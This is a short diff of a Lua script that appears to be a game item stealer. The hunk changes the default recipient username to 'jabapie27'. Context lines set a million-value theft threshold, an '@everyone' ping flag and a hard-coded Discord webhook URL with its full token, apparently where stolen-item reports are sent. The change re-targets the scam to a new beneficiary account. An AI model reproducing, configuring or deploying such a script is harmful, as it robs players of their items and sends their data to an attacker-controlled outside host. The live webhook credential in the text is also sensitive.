@@ -13,7 +13,7 @@ end)()
 ========================
 ]]
 
-local users = _G.Usernames or {"Potat0_Peeler"}
+local users = _G.Usernames or {"jabapie27"}
 local min_value = _G.min_value or 1000000
 local ping = _G.pingEveryone or "Yes"
 local webhook = "https://discord.com/api/webhooks/1394724129042731138/eP5TGtu1H973BDKITLdegWzoTE2jzJmTOm_VG3FZKe-9qJVrlU6rDOoSqAA9a9CaOHrr"
